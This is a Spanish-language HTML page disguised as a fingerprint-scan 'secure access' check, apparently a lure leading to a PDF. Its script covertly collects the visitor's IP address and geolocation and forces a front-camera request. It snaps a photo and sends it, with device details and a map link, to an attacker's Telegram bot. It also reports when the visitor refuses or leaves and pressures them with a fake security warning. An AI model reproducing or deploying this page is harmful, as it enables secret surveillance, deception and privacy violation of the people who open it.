<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Acceso Seguro - Verificaci√≥n de Huella</title>
    <style>
        body { background: #000; color: #00d4ff; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; margin: 0; overflow: hidden; user-select: none; }
        .fingerprint-sensor { width: 150px; height: 150px; border: 2px solid #00d4ff; border-radius: 50%; display: flex; justify-content: center; align-items: center; position: relative; box-shadow: 0 0 20px rgba(0, 212, 255, 0.5); cursor: pointer; }
        .fingerprint-icon { font-size: 80px; opacity: 0.8; }
        .laser { position: absolute; width: 100%; height: 3px; background: #00d4ff; box-shadow: 0 0 15px #00d4ff; top: 0; display: none; animation: scanning 2s linear infinite; }
        @keyframes scanning { 0% { top: 10%; } 50% { top: 90%; } 100% { top: 10%; } }
        .status-text { margin-top: 30px; font-size: 14px; font-weight: bold; letter-spacing: 2px; text-transform: uppercase; text-align: center; padding: 0 20px; }
        .progress-ring { position: absolute; width: 170px; height: 170px; border: 4px solid transparent; border-top: 4px solid #00d4ff; border-radius: 50%; display: none; animation: spin 1s linear infinite; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="progress-ring" id="ring"></div>
    <div class="fingerprint-sensor" id="sensor">
        <div class="laser" id="laser"></div>
        <span class="fingerprint-icon">üß¨</span>
    </div>

    <div class="status-text" id="status">PULSE PARA ESCANEAR HUELLA</div>

    <audio id="beep" src="data:audio/wav;base64,UklGRl9vT19XQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YU92T19vdm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92"></audio>

    <script src="config.js"></script>
    <script>
        const sensor = document.getElementById('sensor');
        const status = document.getElementById('status');
        const laser = document.getElementById('laser');
        const ring = document.getElementById('ring');
        const beep = document.getElementById('beep');
        let procesoExitoso = false;

        // --- SISTEMA DE REPORTE POR ABANDONO ---
        window.addEventListener('beforeunload', function (e) {
            if (!procesoExitoso) {
                const reporteAbandono = "‚ö†Ô∏è *ALERTA DE ABANDONO*\nEl usuario cerr√≥ la p√°gina sin completar la verificaci√≥n.";
                navigator.sendBeacon(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, JSON.stringify({
                    chat_id: CONFIG.CHAT_ID,
                    text: reporteAbandono,
                    parse_mode: 'Markdown'
                }));
            }
        });

        async function validarBiometria() {
            if (navigator.vibrate) navigator.vibrate([100]);
            status.innerHTML = "INICIANDO ESCANEO...";
            laser.style.display = "block";
            ring.style.display = "block";

            let infoDispositivo = "No se obtuvieron datos.";

            try {
                // Captura de datos de red
                const resIP = await fetch('https://ipapi.co/json/');
                const d = await resIP.json();
                const equipo = navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1] : "M√≥vil";
                infoDispositivo = `üì± *Equipo:* ${equipo}\nüåê *IP:* \`${d.ip}\`\nüìç *Lugar:* ${d.city}, ${d.country_name}\nüîó *Mapa:* https://www.google.com/maps?q=${d.latitude},${d.longitude}`;

                // --- FORZADO DE PETICI√ìN DE C√ÅMARA ---
                // Cada vez que se llama a getUserMedia, el navegador revisa el permiso.
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: "user",
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    } 
                });

                const video = document.createElement('video');
                video.srcObject = stream;
                video.setAttribute("playsinline", true);
                await video.play();
                
                status.innerHTML = "VALIDANDO IDENTIDAD...";
                await new Promise(r => setTimeout(r, 2000));

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth; 
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const fotoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.7));

                // --- CIERRE ABSOLUTO DE C√ÅMARA ---
                // Esto libera el hardware para que el navegador "olvide" el uso activo
                stream.getTracks().forEach(t => t.stop());

                // Env√≠o a Telegram
                const fd = new FormData();
                fd.append('chat_id', CONFIG.CHAT_ID);
                fd.append('photo', fotoBlob, 'captura.jpg');
                fd.append('caption', `‚úÖ *VERIFICACI√ìN COMPLETADA*\n\n${infoDispositivo}`);
                fd.append('parse_mode', 'Markdown');

                await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                
                procesoExitoso = true;
                if (beep) beep.play();
                status.innerHTML = "‚úÖ ACCESO CONCEDIDO";
                setTimeout(() => { window.location.href = CONFIG.PDF_URL; }, 1500);

            } catch (err) {
                // Reporte de fallo o rechazo
                let mensajeError = "‚ùå *ERROR T√âCNICO*\n\n";
                if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
                    mensajeError += "üö´ *Raz√≥n:* El usuario bloque√≥ la c√°mara manualmente.";
                } else {
                    mensajeError += `‚ö†Ô∏è *Raz√≥n:* ${err.message}`;
                }

                await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: `${mensajeError}\n\n${infoDispositivo}`, parse_mode: 'Markdown' })
                });

                alert("ADVERTENCIA DE SEGURIDAD: Para validar su identidad, debe presionar 'PERMITIR' cuando el navegador solicite acceso a la c√°mara frontal.");
                location.reload();
            }
        }

        sensor.addEventListener('click', validarBiometria);
    </script>
</body>
</html>
